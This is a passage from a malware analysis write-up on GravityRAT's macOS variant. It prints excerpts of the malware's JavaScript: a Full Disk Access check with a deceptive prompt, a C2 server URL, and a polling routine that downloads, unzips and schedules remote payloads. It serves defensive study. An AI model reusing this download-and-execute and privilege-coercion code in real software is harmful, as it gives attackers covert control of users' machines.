</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 3</span><span>        <span style="color:#66d9ef">if</span>(<span style="color:#a6e22e">error</span> <span style="color:#f92672">||</span> <span style="color:#a6e22e">error</span> <span style="color:#f92672">!==</span> <span style="color:#66d9ef">null</span>){
</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 4</span><span>                <span style="color:#66d9ef">const</span> <span style="color:#a6e22e">options</span> <span style="color:#f92672">=</span> {
</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 5</span><span>           <span style="color:#a6e22e">type</span><span style="color:#f92672">:</span> <span style="color:#e6db74">&#39;question&#39;</span>,
</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 6</span><span>           <span style="color:#a6e22e">buttons</span><span style="color:#f92672">:</span> [<span style="color:#e6db74">&#39;Ok&#39;</span>],
</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 7</span><span>           <span style="color:#a6e22e">defaultId</span><span style="color:#f92672">:</span> <span style="color:#ae81ff">2</span>,
</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 8</span><span>           <span style="color:#a6e22e">title</span><span style="color:#f92672">:</span> <span style="color:#e6db74">&#39;Internet Connectivity Required&#39;</span>,
</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 9</span><span>           <span style="color:#a6e22e">message</span><span style="color:#f92672">:</span> <span style="color:#e6db74">&#39;Action Required&#39;</span>,
</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">10</span><span>           <span style="color:#a6e22e">detail</span><span style="color:#f92672">:</span> <span style="color:#e6db74">&#34;Sorry! Please check your internet connectivity and try again.&#34;</span>
</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">11</span><span>         };
</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">12</span><span>     
</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">13</span><span>         <span style="color:#a6e22e">dialog</span>.<span style="color:#a6e22e">showMessageBox</span>(<span style="color:#66d9ef">null</span>, <span style="color:#a6e22e">options</span>, (<span style="color:#a6e22e">response</span>, <span style="color:#a6e22e">checkboxChecked</span>) =&gt; {
</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">14</span><span>            <span style="color:#a6e22e">app</span>.<span style="color:#a6e22e">quit</span>();
</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">15</span><span>            <span style="color:#a6e22e">app</span>.<span style="color:#a6e22e">exit</span>();
</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">16</span><span>         });
</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">17</span><span>        
</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">18</span><span>   } });
</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">19</span><span>}</span></span></code></pre></div>
<p>Via our <a href="https://objective-see.com/products/utilities.html#ProcessMonitor">Process Monitor</a>, we can observe this execution of the <code>ping</code> command:</p>
<div style="border: 1px solid gray; border-radius: 4px; padding-left:25px; padding-right:25px; overflow-wrap: break-word; background-color:#2A2E35; color:lime;">
    <pre style="font-size: 18px;">
# ProcessMonitor.app/Contents/MacOS/ProcessMonitor -pretty
...

{
  "event" : "ES_EVENT_TYPE_NOTIFY_EXEC",
  "process" : {
    "uid" : 501,
    "arguments" : [
      "ping",
      "-t",
      "4",
      "www.google.com"
    ],
    "ppid" : 1447,
    "ancestors" : [
      1447,
      1
    ],
    "path" : "/sbin/ping",
    ...
  }
}

</pre>
</div>
<p>Lastly the <code>main.js</code> function checks if the malware has been granted Full Disk Access (FDA).</p>
<div class="note">
<p>On recent versions of macOS, applications are prevented from accessing various user/system files, unless the user has manually granted the application &ldquo;Full Disk Access&rdquo; (via the System Preferences application).</p>
<p>As such, malware that desires indiscriminate file system access may attempt to coerce users into granting such access.</p>
</div>
<p>In order to check if has Full Disk Access, <code>GravityRat</code> attempts to list the files in the <code>~/Library/Safari</code>. As this directory is inaccessible to applications without FDA, this is sufficient check. If the malware determines it does not have FDA, it will prompt to the user to grant such access:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-JavaScript" data-lang="JavaScript"><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 1</span><span><span style="color:#66d9ef">var</span> <span style="color:#a6e22e">ressslt</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">execRoot</span>(<span style="color:#e6db74">&#39;ls ~/Library/Safari&#39;</span>, <span style="color:#66d9ef">function</span>(<span style="color:#a6e22e">err</span>, <span style="color:#a6e22e">data</span>, <span style="color:#a6e22e">stderr</span>){
</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 2</span><span>
</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 3</span><span>  <span style="color:#66d9ef">if</span>(<span style="color:#f92672">!</span><span style="color:#a6e22e">data</span> <span style="color:#f92672">||</span> <span style="color:#a6e22e">data</span> <span style="color:#f92672">==</span><span style="color:#e6db74">&#34;&#34;</span>)
</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 4</span><span>  {
</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 5</span><span>    <span style="color:#66d9ef">const</span> <span style="color:#a6e22e">options</span> <span style="color:#f92672">=</span> {
</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 6</span><span>            <span style="color:#a6e22e">type</span><span style="color:#f92672">:</span> <span style="color:#e6db74">&#39;question&#39;</span>,
</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 7</span><span>            <span style="color:#a6e22e">buttons</span><span style="color:#f92672">:</span> [<span style="color:#e6db74">&#39;Ok&#39;</span>],
</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 8</span><span>            <span style="color:#a6e22e">defaultId</span><span style="color:#f92672">:</span> <span style="color:#ae81ff">2</span>,
</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 9</span><span>            <span style="color:#a6e22e">title</span><span style="color:#f92672">:</span> <span style="color:#e6db74">&#39;StrongBox - Operation Not Permitted&#39;</span>,
</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">10</span><span>            <span style="color:#a6e22e">message</span><span style="color:#f92672">:</span> <span style="color:#e6db74">&#39;Action Required&#39;</span>,
</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">11</span><span>            <span style="color:#a6e22e">detail</span><span style="color:#f92672">:</span> <span style="color:#e6db74">&#34;Please follow the instructions to resolve this issue
</span></span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">12</span><span><span style="color:#e6db74">                     System Preferences -&gt; Security &amp; Privacy -&gt; 
</span></span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">13</span><span><span style="color:#e6db74">                            Full Disk Access to Terminal.app&#34;</span>
</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">14</span><span>          };
</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">15</span><span>
</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">16</span><span>          <span style="color:#a6e22e">dialog</span>.<span style="color:#a6e22e">showMessageBox</span>(<span style="color:#66d9ef">null</span>, <span style="color:#a6e22e">options</span>, (<span style="color:#a6e22e">response</span>, <span style="color:#a6e22e">checkboxChecked</span>) =&gt; {
</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">17</span><span>            <span style="color:#a6e22e">app</span>.<span style="color:#a6e22e">quit</span>();
</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">18</span><span>            <span style="color:#a6e22e">app</span>.<span style="color:#a6e22e">exit</span>();
</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">19</span><span>          });
</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">20</span><span>          
</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">21</span><span>  } });
</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">22</span><span>}</span></span></code></pre></div>
<p>While the <code>main.js</code> file contains logic related to environmental checks (i.e. VM &amp; FDA checks), the core of the malicious logic appears in the <code>signature.js</code> file. As such, let&rsquo;s now we dive into the <code>signature.js</code> file.</p>
<p>At the start of the <code>signature.js</code> file we find various variables being initialized:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-JavaScript" data-lang="JavaScript"><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">1</span><span><span style="color:#66d9ef">var</span> <span style="color:#a6e22e">srur</span> <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;https://download.strongbox.in/strongbox/&#39;</span>;
</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">2</span><span><span style="color:#66d9ef">var</span> <span style="color:#a6e22e">srdr</span> <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;https://download.strongbox.in/A0B74607.php&#39;</span>;
</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">3</span><span><span style="color:#66d9ef">var</span> <span style="color:#a6e22e">loclpth</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">path</span>.<span style="color:#a6e22e">join</span>(<span style="color:#a6e22e">app1</span>.<span style="color:#a6e22e">getPath</span>(<span style="color:#e6db74">&#39;appData&#39;</span>), <span style="color:#e6db74">&#39;/SCloud&#39;</span>);</span></span></code></pre></div>
<p>These variable appear to the malware&rsquo;s command and control server and a directory path, found within the user application data directory (that we&rsquo;ll see is used for persistence).</p>
<div class="note">
<p>The malware&rsquo;s server, download.strongbox.in, appears to be now offline:</p>
<p>$ nslookup download.strongbox.in
Server:   8.8.8.8
Address:  8.8.8.8#53</p>
<p>** server can&rsquo;t find download.strongbox.in: SERVFAIL</p>
</div>
<br>
<div class="note">
<p>The code snippet, getPath(&lsquo;appData&rsquo;), will return the &ldquo;Per-user application data directory&rdquo;, which on macOS points to ~/Library/Application Support.</p>
</div>
<p>If needed, the malware then will create the directory specified in the <code>loclpth</code> variable (<code>~/Library/Application Support/SCloud</code>):</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-JavaScript" data-lang="JavaScript"><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">1</span><span><span style="color:#66d9ef">if</span> (<span style="color:#f92672">!</span><span style="color:#a6e22e">fs</span>.<span style="color:#a6e22e">existsSync</span>(<span style="color:#a6e22e">loclpth</span>)){
</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">2</span><span>    <span style="color:#a6e22e">fs</span>.<span style="color:#a6e22e">mkdirSync</span>(<span style="color:#a6e22e">loclpth</span>,<span style="color:#ae81ff">0700</span>);</span></span></code></pre></div>
<p>Further down in the <code>signature.js</code> file, we can see the malware invoking a function named <code>updates</code> via the <code>setInterval</code> API:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-JavaScript" data-lang="JavaScript"><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">1</span><span><span style="color:#a6e22e">setInterval</span>(<span style="color:#a6e22e">updates</span>,<span style="color:#ae81ff">180000</span>)  
</span></span></code></pre></div>
<p>As its name implies, the <code>updates</code> will download a file (and &ldquo;update&rdquo;) from the server specified in the <code>srdr</code> variable (<code>https://download.strongbox.in/A0B74607.php</code>):</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-JavaScript" data-lang="JavaScript"><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 1</span><span><span style="color:#66d9ef">function</span> <span style="color:#a6e22e">updates</span>()
</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 2</span><span>{
</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 3</span><span>  <span style="color:#66d9ef">const</span> <span style="color:#a6e22e">insst</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">axios</span>.<span style="color:#a6e22e">create</span>();
</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 4</span><span>  <span style="color:#66d9ef">var</span> <span style="color:#a6e22e">hash</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">store</span>.<span style="color:#a6e22e">get</span>(<span style="color:#e6db74">&#39;Hash&#39;</span>)
</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 5</span><span>  <span style="color:#a6e22e">axios</span>.<span style="color:#a6e22e">post</span>(<span style="color:#a6e22e">srdr</span>, {
</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 6</span><span>        <span style="color:#a6e22e">value</span><span style="color:#f92672">:</span> <span style="color:#e6db74">&#39;update&#39;</span>,
</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 7</span><span>        <span style="color:#a6e22e">hash</span><span style="color:#f92672">:</span> <span style="color:#a6e22e">hash</span>
</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 8</span><span>        })
</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 9</span><span>  .<span style="color:#a6e22e">then</span>((<span style="color:#a6e22e">response</span>) =&gt; {
</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">10</span><span>        <span style="color:#66d9ef">var</span> <span style="color:#a6e22e">respns</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">response</span>.<span style="color:#a6e22e">data</span>;
</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">11</span><span>        <span style="color:#66d9ef">if</span>(<span style="color:#a6e22e">respns</span>){
</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">12</span><span>        <span style="color:#66d9ef">var</span> <span style="color:#a6e22e">rply</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">respns</span>.<span style="color:#a6e22e">split</span>(<span style="color:#e6db74">&#39;#&#39;</span>);
</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">13</span><span>        <span style="color:#66d9ef">var</span> <span style="color:#a6e22e">fname</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">rply</span>[<span style="color:#ae81ff">0</span>].<span style="color:#a6e22e">trim</span>();
</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">14</span><span>        <span style="color:#66d9ef">var</span> <span style="color:#a6e22e">agentTask</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">rply</span>[<span style="color:#ae81ff">1</span>];
</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">15</span><span>  }
</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">16</span><span>        
</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">17</span><span>  ...
</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">18</span><span>
</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">19</span><span>  <span style="color:#66d9ef">var</span> <span style="color:#a6e22e">dpath</span>;
</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">20</span><span>  <span style="color:#66d9ef">if</span>(<span style="color:#a6e22e">osvar</span>.<span style="color:#a6e22e">trim</span>()<span style="color:#f92672">==</span><span style="color:#e6db74">&#34;darwin&#34;</span>)
</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">21</span><span>  <span style="color:#66d9ef">var</span> <span style="color:#a6e22e">file</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">fs</span>.<span style="color:#a6e22e">createWriteStream</span>(<span style="color:#a6e22e">dpath</span>);
</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">22</span><span>  <span style="color:#66d9ef">var</span> <span style="color:#a6e22e">request</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">https</span>.<span style="color:#a6e22e">get</span>(<span style="color:#a6e22e">srur</span><span style="color:#f92672">+</span><span style="color:#e6db74">&#39;Updates/&#39;</span> <span style="color:#f92672">+</span> <span style="color:#a6e22e">fname</span>, <span style="color:#66d9ef">function</span>(<span style="color:#a6e22e">response</span>) {
</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">23</span><span>  <span style="color:#a6e22e">response</span>.<span style="color:#a6e22e">pipe</span>(<span style="color:#a6e22e">file</span>);
</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">24</span><span>  <span style="color:#a6e22e">file</span>.<span style="color:#a6e22e">on</span>(<span style="color:#e6db74">&#39;finish&#39;</span>, <span style="color:#66d9ef">function</span>() {
</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">25</span><span>    <span style="color:#a6e22e">getDateTime</span>();
</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">26</span><span>    <span style="color:#a6e22e">extractzip1</span>(<span style="color:#a6e22e">fname</span>,<span style="color:#a6e22e">agentTask</span>);
</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">27</span><span>    <span style="color:#a6e22e">file</span>.<span style="color:#a6e22e">close</span>();
</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">28</span><span>  });
</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">29</span><span>
</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">30</span><span>  ...
</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">31</span><span>}</span></span></code></pre></div>
<p>If this remote server (<code>https://download.strongbox.in/A0B74607.php</code>), provides a payload for download, the malware will then invoke the <code>extractzip1</code> function:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-JavaScript" data-lang="JavaScript"><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 1</span><span><span style="color:#66d9ef">function</span> <span style="color:#a6e22e">extractzip1</span>(<span style="color:#a6e22e">fname</span>,<span style="color:#a6e22e">agentTask</span>)
</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 2</span><span>{
</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 3</span><span>  
</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 4</span><span>  <span style="color:#66d9ef">var</span> <span style="color:#a6e22e">source</span>;
</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 5</span><span>  <span style="color:#66d9ef">var</span> <span style="color:#a6e22e">sourceTozip</span>;
</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 6</span><span>  <span style="color:#66d9ef">if</span>(<span style="color:#a6e22e">osvar</span>.<span style="color:#a6e22e">trim</span>()<span style="color:#f92672">==</span><span style="color:#e6db74">&#34;darwin&#34;</span>) {
</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 7</span><span>      <span style="color:#a6e22e">source</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">loclpth</span><span style="color:#f92672">+</span><span style="color:#e6db74">&#34;/&#34;</span><span style="color:#f92672">+</span><span style="color:#a6e22e">fname</span>;
</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 8</span><span>      <span style="color:#a6e22e">sourceTozip</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">source</span><span style="color:#f92672">+</span><span style="color:#e6db74">&#34;.zip&#34;</span>;
</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 9</span><span>  }
</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">10</span><span>    
</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">11</span><span>  ...
</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">12</span><span>  <span style="color:#a6e22e">fs</span>.<span style="color:#a6e22e">rename</span>(<span style="color:#a6e22e">source</span>, <span style="color:#a6e22e">sourceTozip</span>, <span style="color:#66d9ef">function</span>(<span style="color:#a6e22e">err</span>) {
</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">13</span><span>  
</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">14</span><span>  });
</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">15</span><span>
</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">16</span><span>  
</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">17</span><span>  <span style="color:#66d9ef">if</span>(<span style="color:#a6e22e">osvar</span>.<span style="color:#a6e22e">trim</span>()<span style="color:#f92672">==</span><span style="color:#e6db74">&#34;darwin&#34;</span>) {
</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">18</span><span>    <span style="color:#66d9ef">var</span> <span style="color:#a6e22e">extract</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">require</span>(<span style="color:#e6db74">&#39;extract-zip&#39;</span>)
</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">19</span><span>    <span style="color:#66d9ef">var</span> <span style="color:#a6e22e">target</span><span style="color:#f92672">=</span> <span style="color:#a6e22e">loclpth</span>;
</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">20</span><span>    <span style="color:#a6e22e">extract</span>(<span style="color:#a6e22e">sourceTozip</span>, {<span style="color:#a6e22e">dir</span><span style="color:#f92672">:</span> <span style="color:#a6e22e">target</span>}, <span style="color:#66d9ef">function</span> (<span style="color:#a6e22e">err</span>) {
</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">21</span><span>     
</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">22</span><span>     ...
</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">23</span><span>     <span style="color:#a6e22e">scheduleMac</span>(<span style="color:#a6e22e">fname</span>,<span style="color:#a6e22e">agentTask</span>);
</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">24</span><span>     }
</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">25</span><span>    });
</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">26</span><span>  }
</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">27</span><span>}</span></span></code></pre></div>
<p>After appending <code>.zip</code>, the malware extracts the downloaded (zip) file to the location specified in the <code>loclpth</code> variable (<code>~/Library/Application Support/SCloud</code>). Once extracted it invokes a function named <code>scheduleMac</code> to persist and launch the downloaded payload.</p>
<p>The <code>scheduleMac</code> persists the downloaded payload as cronjob, via the builtin <code>crontab</code> command:</p>
